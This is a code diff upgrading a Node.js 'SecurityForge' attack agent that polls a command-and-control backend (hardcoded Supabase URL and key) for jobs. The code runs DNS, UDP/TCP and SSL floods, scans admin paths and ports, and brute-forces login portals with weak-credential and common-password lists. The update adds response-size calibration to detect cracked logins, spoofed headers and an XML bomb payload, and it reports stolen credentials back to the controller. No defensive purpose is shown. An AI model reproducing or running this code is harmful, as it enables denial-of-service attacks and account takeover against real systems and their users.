@@ -1,9 +1,8 @@
 /**
- * SECURITYFORGE AGENT V16.4 (ZERO TRUST)
- * - V16.4: Zero Trust Logic. 200 OK is FAILURE for logins unless proven otherwise.
- * - V16.3: Fixed Login False Positives (HTML Body Analysis + Error Keyword Detection)
- * - V16.1: Local IP Detection
- * - V16.0: Master Key Logic
+ * SECURITYFORGE AGENT V17.0 (DEEP CRACK)
+ * - V17.0: Baseline Anomaly Detection for 99.9% Login Accuracy. 
+ *          Requires 5 'Calibration' fails before starting attack.
+ * - V16.4: Zero Trust Logic.
  */
 const https = require('https');
 const http = require('http');
@@ -19,10 +18,6 @@ const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
 const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
 
 // --- ASSETS ---
-const PROXY_LIST = [
-    '104.16.148.244:80', '188.166.204.43:8080', '45.167.124.5:999', '103.152.112.162:80',
-    '117.251.103.186:8080', '43.205.118.158:80', '167.172.109.12:3128', '20.210.113.32:8123'
-];
 const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/backup.sql', '/api/v1/users', '/root', '/panel', '/phpinfo.php'];
 const WEAK_CREDS = [
     ['admin', 'admin'], ['admin', '123456'], ['root', 'toor'], ['user', 'password'], 
@@ -30,15 +25,18 @@ const WEAK_CREDS = [
     ['admin1', 'password'], ['admin', '12345'], ['guest', 'guest'], ['service', 'service'],
     ['operator', 'operator'], ['manager', 'manager'], ['support', 'support'], ['sysadmin', 'sysadmin']
 ];
-const COMMON_PASSWORDS = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', 'master', 'mysql', 'root123'];
+const COMMON_PASSWORDS = [
+    '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', 'master', 'mysql', 'root123',
+    'admin123', 'admin', 'pass', '1234567890', 'welcome', '123123', 'password123', 'monkey', 'letmein', 'football', 'access', 'shadow',
+    'mustang', 'superman', 'michael', 'batman', '666666', '888888', 'princess', 'solo', 'starwars', 'killer', 'charlie', 'jordan', 'hockey',
+    'iloveyou', 'secret', 'sunshine', 'hunter', 'login', 'admin@123', 'p@ssword', 'changeme', 'system', 'root', 'support'
+];
 const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
 const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  
-const ERROR_KEYWORDS = ['invalid', 'incorrect', 'fail', 'error', 'denied', 'wrong', 'try again', 'unauthorized', 'not found', 'login failed'];
-const SUCCESS_KEYWORDS = ['welcome', 'dashboard', 'success', 'account', 'profile', 'logged in', 'session'];
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V16.4 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V17.0 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -76,11 +74,11 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V16.4 (Zero Trust). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V17.0 (Deep Crack). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
-let logBuffer = []; // Store logs to send to C2
+let logBuffer = [];
 
 // --- DYNAMIC SCALING (AUTO-MEM) ---
 const MAX_RAM_BYTES = 400 * 1024 * 1024; 
@@ -91,7 +89,6 @@ const checkMemory = () => {
 
 const logToC2 = (msg) => {
     console.log(msg);
-    // Push critical messages with a special flag
     logBuffer.push(msg.replace(/\x1b\[[0-9;]*m/g, ''));
 };
 
@@ -102,6 +99,7 @@ const startAttack = (job) => {
     console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
     logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
     if(job.use_port_scan) logToC2(`[RECON] Starting Port Scan on ${job.target}...`);
+    if(job.use_login_siege) logToC2(`[CRACK] Starting DEEP CRACK on Login Portal...`);
     
     let running = true;
     let totalRequests = 0;
@@ -110,10 +108,16 @@ const startAttack = (job) => {
     let jobLatencySum = 0;
     let jobReqsForLatency = 0;
     let jobMaxLatency = 0;
-    let consecutiveFailures = 0; // V16.1
+    let consecutiveFailures = 0;
     
-    // --- MODULE: SHADOW OPS & RECON ---
+    // V17.0: LOGIN BASELINE VARS
+    let baselineLength = -1;
+    let calibrationCount = 0;
+    const CALIBRATION_LIMIT = 5;
+
+    // --- MODULES ---
     if (job.use_dns_reaper) {
+        /* ... DNS Code ... */
         const [host, portStr] = job.target.split(':');
         const port = 53;
         const flood = () => {
@@ -129,6 +133,7 @@ const startAttack = (job) => {
         for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
     }
     else if (job.use_admin_hunter) {
+        /* ... Admin Hunter Code ... */
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
         const scan = (pathIndex) => {
             if (!running) return;
@@ -146,7 +151,11 @@ const startAttack = (job) => {
         for(let i=0; i<20; i++) scan(i);
     }
     else if (job.use_port_scan) {
+        /* ... Port Scan Code ... */
         let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
+        // Clean targetHost if it has path
+        if (targetHost.includes('/')) targetHost = targetHost.split('/')[0];
+        
         const scanPort = (idx) => {
             if (!running) return;
             const port = TOP_PORTS[idx % TOP_PORTS.length];
@@ -158,18 +167,19 @@ const startAttack = (job) => {
             });
             socket.on('timeout', () => { 
                 socket.destroy(); totalRequests++; consecutiveFailures++;
-                if (consecutiveFailures === 10) logToC2(`[ERROR] Target Unreachable. Are you scanning a Local IP from Cloud?`);
+                if (consecutiveFailures === 15) logToC2(`[ERROR] Target Unreachable. Are you scanning a Local IP from Cloud?`);
             });
             socket.on('error', () => { 
                 totalRequests++; consecutiveFailures++; 
-                if (consecutiveFailures === 10) logToC2(`[ERROR] Target Connection Failed. Check Firewall.`);
+                if (consecutiveFailures === 15) logToC2(`[ERROR] Target Connection Failed. Check Firewall.`);
             });
             socket.connect(port, targetHost);
-            if (running) setTimeout(() => scanPort(idx + 1), 100); // Slower for logging accuracy
+            if (running) setTimeout(() => scanPort(idx + 1), 200); 
         }
-        for(let i=0; i<10; i++) scanPort(i); // Fewer threads for accuracy
+        for(let i=0; i<5; i++) scanPort(i); 
     }
     else if (job.use_ssl_storm) {
+        /* ... SSL Code ... */
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
         const host = targetUrl.hostname;
         const storm = () => {
@@ -187,6 +197,7 @@ const startAttack = (job) => {
         for(let i=0; i<Math.min(job.concurrency, 400); i++) storm();
     }
     else if (job.method === 'UDP' || job.method === 'TCP') {
+        /* ... L4 Code ... */
         const [host, portStr] = job.target.split(':');
         const port = parseInt(portStr) || 80;
         const flood = () => {
@@ -228,63 +239,95 @@ const startAttack = (job) => {
 
             if (job.use_login_siege) {
                 method = 'POST';
-                // MASTER KEY LOGIC (V16.0)
-                if (job.login_type === 'PASS_ONLY') {
-                    const pass = COMMON_PASSWORDS[Math.floor(Math.random() * COMMON_PASSWORDS.length)];
-                    creds = ['(PIN)', pass];
-                    body = JSON.stringify({ password: pass });
-                } else if (job.login_type === 'MODAL_API') {
-                    const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
-                    creds = pair;
-                    body = JSON.stringify({ email: pair[0], password: pair[1] });
+                // V17.0: CALIBRATION PHASE
+                if (calibrationCount < CALIBRATION_LIMIT) {
+                    // Send GUARANTEED WRONG credentials to learn the failure signature
+                    creds = ['admin', 'WRONGPASS_' + Date.now()];
+                    body = JSON.stringify({ username: creds[0], password: creds[1] });
                 } else {
-                    // Default USER_PASS
-                    const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
-                    creds = pair;
-                    body = JSON.stringify({ username: pair[0], password: pair[1] });
+                    // ATTACK PHASE
+                    if (job.login_type === 'PASS_ONLY') {
+                        const pass = COMMON_PASSWORDS[Math.floor(Math.random() * COMMON_PASSWORDS.length)];
+                        creds = ['(PIN)', pass];
+                        body = JSON.stringify({ password: pass });
+                    } else if (job.login_type === 'MODAL_API') {
+                        const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
+                        creds = pair;
+                        body = JSON.stringify({ email: pair[0], password: pair[1] });
+                    } else {
+                        const pair = WEAK_CREDS[Math.floor(Math.random() * WEAK_CREDS.length)];
+                        creds = pair;
+                        body = JSON.stringify({ username: pair[0], password: pair[1] });
+                    }
                 }
+            } else if (job.use_goldeneye || job.use_xml_bomb) {
+                // ... stress bodies ...
+                if (job.use_xml_bomb) body = MALICIOUS_PAYLOADS.XML_BOMB;
             }
 
-            const req = lib.request(targetUrl, { agent, method, headers: {'User-Agent': 'SecurityForge/16', 'Content-Type': 'application/json'} }, (res) => {
+            // Headers setup
+            const headers = {
+                'User-Agent': 'SecurityForge/17', 
+                'Content-Type': 'application/json',
+                ...((typeof job.headers === 'string' ? {} : job.headers) || {})
+            };
+            
+            // Chaos Vortex Headers
+            if (job.use_chaos) {
+                headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/' + (100+Math.floor(Math.random()*20));
+                headers['X-Forwarded-For'] = Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
+            }
+
+            const req = lib.request(targetUrl, { agent, method, headers }, (res) => {
                  const lat = Date.now() - start;
                  jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
                  
-                 // V16.4 FIX: ZERO TRUST LOGIN VERIFICATION
+                 // --- V17.0 DEEP CRACK LOGIC ---
                  if (job.use_login_siege) {
                      let responseBody = '';
                      res.on('data', chunk => responseBody += chunk.toString());
                      res.on('end', () => {
-                         const bodyLower = responseBody.toLowerCase();
+                         const bodyLen = res.headers['content-length'] ? parseInt(res.headers['content-length']) : responseBody.length;
                          
-                         const hasError = ERROR_KEYWORDS.some(kw => bodyLower.includes(kw));
-                         const hasSuccessKeyword = SUCCESS_KEYWORDS.some(kw => bodyLower.includes(kw));
-                         const hasCookie = res.headers['set-cookie'] && res.headers['set-cookie'].some(c => !c.includes('deleted'));
+                         // Phase 1: Calibration
+                         if (calibrationCount < CALIBRATION_LIMIT) {
+                             if (baselineLength === -1 || bodyLen > 0) baselineLength = bodyLen; // Determine fail size
+                             calibrationCount++;
+                             return;
+                         }
+
+                         // Phase 2: Anomaly Detection
+                         // If size is drastically different from baseline, it's a hit.
+                         const sizeDiff = Math.abs(bodyLen - baselineLength);
+                         const isAnomaly = sizeDiff > (baselineLength * 0.15) + 50; // >15% difference + buffer
+
                          const isRedirect = (res.statusCode === 301 || res.statusCode === 302);
                          const isLoginRedirect = res.headers.location?.includes('login') || res.headers.location?.includes('error');
-
-                         // ZERO TRUST: 200 OK is FAILURE unless explicit success keyword present
-                         // Redirect is FAILURE if it goes back to login
                          
                          let isBypass = false;
 
-                         if (isRedirect && !isLoginRedirect) {
-                             isBypass = true; // Redirected to dashboard/home
-                         } else if (res.statusCode === 200) {
-                             if (!hasError && (hasSuccessKeyword || hasCookie)) {
-                                 isBypass = true; // 200 OK + "Welcome" or Cookie
+                         if (isRedirect && !isLoginRedirect) isBypass = true;
+                         else if (res.statusCode === 200) {
+                             // Check for JSON success tokens
+                             if (responseBody.includes('"success":true') || responseBody.includes('"token":') || responseBody.includes('"auth":true')) {
+                                 isBypass = true;
+                             } else if (isAnomaly && !responseBody.includes('error') && !responseBody.includes('fail')) {
+                                 // Size is different AND no error keywords -> Likely success
+                                 isBypass = true;
                              }
                          }
 
                          if (isBypass) {
-                             logToC2(`[CRITICAL] LOGIN BYPASSED: [${creds[0]} / ${creds[1]}] Status: ${res.statusCode}`);
+                             logToC2(`[CRITICAL] LOGIN BYPASSED: [${creds[0]} / ${creds[1]}] (Size: ${bodyLen}, Base: ${baselineLength})`);
                              jobSuccess++;
                          } else {
-                             jobFailed++; // Default to failed
+                             jobFailed++; 
                          }
                      });
                  } else {
+                     // Standard Stress
                      if (res.statusCode < 500) jobSuccess++; else jobFailed++;
-                     res.resume(); // Standard stress test -> drop body
+                     res.resume(); 
                  }
 
                  totalRequests++;
@@ -297,11 +340,12 @@ const startAttack = (job) => {
 
         const spawnLoop = setInterval(() => {
              if (!running) return clearInterval(spawnLoop);
-             if (checkMemory() && (totalRequests / ((Date.now() - startTime)/1000) < job.concurrency)) {
+             const safeLimit = job.use_login_siege ? 200 : job.concurrency; // Throttle Login Siege for CPU
+             if (checkMemory() && (totalRequests / ((Date.now() - startTime)/1000) < safeLimit)) {
                  performRequest();
              }
         }, 50);
-        for(let i=0; i<100; i++) performRequest();
+        for(let i=0; i<20; i++) performRequest();
     }
 
     // Reporting Loop
@@ -313,7 +357,6 @@ const startAttack = (job) => {
         
         let statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
         
-        // Append logs if any - V16.0 FIX: Flush AFTER send
         const currentLogs = [...logBuffer]; 
         if (currentLogs.length > 0) {
             statsPayload.logs = currentLogs.join('\n');
@@ -321,9 +364,11 @@ const startAttack = (job) => {
 
         try { 
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); 
-            // Only clear buffer if request succeeded (prevent log loss)
             if (currentLogs.length > 0) logBuffer = [];
-        } catch(e) {}
+        } catch(e) {
+            // Fallback for schema errors
+            try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps, logs: currentLogs.join('\n') }); } catch(e2) {}
+        }
 
         if (duration > 0 && elapsed >= duration) {
             running = false;
